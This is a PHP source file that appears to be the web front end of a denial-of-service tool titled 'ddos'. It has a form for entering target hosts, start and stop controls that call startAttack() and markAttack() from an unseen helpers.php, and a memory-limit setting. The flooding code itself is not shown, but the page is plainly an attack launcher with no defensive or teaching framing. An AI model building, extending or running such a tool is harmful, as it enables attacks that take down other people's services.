<?php
require_once 'helpers.php';
if (isset($_POST['targets'])) {
    startAttack();
}
markAttack();

setInfo();

$memory_limit = getMemoryLimit();
?>

<html lang="en">
<head>
    <title>ddos</title>
</head>
<body>
<form action="/" method="post">

    <br>
    <label>
        <textarea placeholder="targets" name="targets"></textarea>
    </label>

    <button type="submit">action</button>
</form>

<form action="" method="post">
    <label for="">
        <input type="hidden" name="stop" value="1">
    </label>
    <button type="submit">Stop</button>
</form>


<h1><a href="/">home</a></h1>

<form action="" method="post">
    <label for="">
        <input type="number" name="memory_limit" value="<?php echo $memory_limit ?>">
    </label>
    <button type="submit">set memory limit</button>
</form>

</body>
</html>
